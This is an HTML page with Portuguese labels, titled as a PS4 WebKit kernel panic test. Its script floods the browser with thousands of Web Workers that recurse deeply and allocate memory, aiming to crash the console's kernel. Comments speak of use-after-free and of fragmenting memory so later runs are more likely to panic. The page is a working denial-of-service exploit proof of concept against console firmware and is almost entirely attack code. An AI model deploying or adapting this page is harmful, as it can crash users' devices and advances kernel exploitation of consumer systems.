<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 Worker/Stack Stress Test</title>
    
</head>
<body>

    <h2>PS4 WebKit Kernel Panic Test (Worker Flood)</h2>
    <p>Use com cuidado. O objetivo é reproduzir o Kernel Panic ajustando os valores.</p>

    <div class="control-group">
        <div>
            <label>Total Workers (Alvo):</label>
            <input type="number" id="targetWorkers" value="2000">
        </div>
        <div style="margin-top:5px;">
            <label>Batch Size (por 10ms):</label>
            <input type="number" id="batchSize" value="20">
        </div>
        <div style="margin-top:5px;">
            <label>Recursion Depth:</label>
            <input type="number" id="recursionDepth" value="500">
            <span style="font-size:12px; color:#aaa;">(Stack Pressure)</span>
        </div>
    </div>

    <div class="control-group">
        <button id="btn-run" onclick="startStress()">INICIAR STRESS</button>
        <button id="btn-stop" onclick="stopStress()">PARAR / LIMPAR</button>
    </div>

    <div id="log-area">Pronto. Aguardando comando...</div>

    <script>
        let stressInterval = null;
        let activeWorkers = [];
        let logArea = document.getElementById('log-area');

        function log(msg) {
            const time = new Date().toLocaleTimeString();
            logArea.innerHTML += `[${time}] ${msg}\n`;
            logArea.scrollTop = logArea.scrollHeight;
        }

        function createWorkerBlob(depth) {
            // Código do worker dinâmico baseado no input
            const workerCode = `
                function deep(n) {
                    // Aloca array para sujar o stack/heap rapidamente
                    const v = new Float64Array(128); 
                    if (n > 0) deep(n-1);
                }
                
                self.onmessage = function(e) {
                    if(e.data === 'start') {
                        try {
                            deep(${depth});
                            postMessage("Done");
                        } catch(err) {
                            postMessage("Error");
                        }
                    }
                };
            `;
            return URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
        }

        function startStress() {
            if(stressInterval) return;
            
            const target = parseInt(document.getElementById('targetWorkers').value);
            const batch = parseInt(document.getElementById('batchSize').value);
            const depth = parseInt(document.getElementById('recursionDepth').value);
            
            log(`>>> INICIANDO: Alvo=${target}, Batch=${batch}, Depth=${depth}`);
            log("[INFO] Se o console desligar, Panic confirmado.");

            const workerUrl = createWorkerBlob(depth);
            let currentCount = 0;

            stressInterval = setInterval(() => {
                try {
                    for(let i = 0; i < batch; i++) {
                        const w = new Worker(workerUrl);
                        // Mantemos referência para impedir GC imediato se necessário, 
                        // ou soltamos para testar Use-After-Free.
                        // Aqui, apenas iniciamos.
                        w.postMessage('start'); 
                        w.onmessage = () => {}; // No-op
                        activeWorkers.push(w);
                    }
                    
                    currentCount += batch;
                    
                    if(currentCount % 100 === 0) {
                        log(`[Stress] Workers criados: ${currentCount}`);
                    }

                    if(currentCount >= target) {
                        clearInterval(stressInterval);
                        stressInterval = null;
                        log(">>> ALVO ATINGIDO. Aguardando reação do sistema...");
                        log(">>> Se não crashou, clique em PARAR/LIMPAR e tente novamente (fragmentação).");
                    }
                } catch(e) {
                    log(`[ERRO CRÍTICO JS] ${e.message}`);
                    clearInterval(stressInterval);
                }
            }, 10); // Intervalo fixo de 10ms do seu script original
        }

        function stopStress() {
            if(stressInterval) {
                clearInterval(stressInterval);
                stressInterval = null;
            }
            // Tenta terminar workers para limpar recursos (se o OS permitir)
            let killed = 0;
            for(let w of activeWorkers) {
                w.terminate();
                killed++;
            }
            activeWorkers = [];
            log(`>>> PARADO. ${killed} workers terminados.`);
            log(">>> Memória pode estar fragmentada. Próxima execução tem maior chance de Panic.");
        }
    </script>
</body>
</html>
